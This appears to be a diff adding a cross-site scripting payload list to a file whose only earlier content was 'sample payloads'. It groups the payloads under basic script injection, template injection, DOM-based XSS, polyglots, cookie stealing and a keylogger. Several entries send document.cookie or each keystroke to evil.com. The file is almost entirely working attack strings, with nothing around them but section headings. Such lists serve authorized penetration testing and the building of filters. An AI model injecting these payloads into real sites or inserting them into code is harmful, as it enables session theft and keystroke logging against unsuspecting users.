@@ -1,1 +1,31 @@
-sample payloads 
+# Basic Script Injection
+<script>alert('XSS')</script>
+
+# Template Injection
+${alert(1)}
+{{alert(1)}}
+{{constructor.constructor('alert(1)')()}}
+{alert(1)}
+<%= alert(1) %>
+
+# DOM Based XSS
+<script>eval(location.hash.slice(1))</script>
+<script>document.write(location.search)</script>
+javascript:alert(document.domain)
+
+# Polyglot Payloads
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><svg/onload=alert(1)>
+"><img src=x onerror=alert(1)//>
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+
+# Cookie Stealing
+<script>new Image().src="http://evil.com/steal.php?c="+document.cookie</script>
+<img src=x onerror="this.src='http://evil.com/?c='+document.cookie">
+
+# Keylogger
+<script>
+document.onkeypress=function(e){
+    new Image().src="http://evil.com/log?k="+e.key;
+}
+</script>
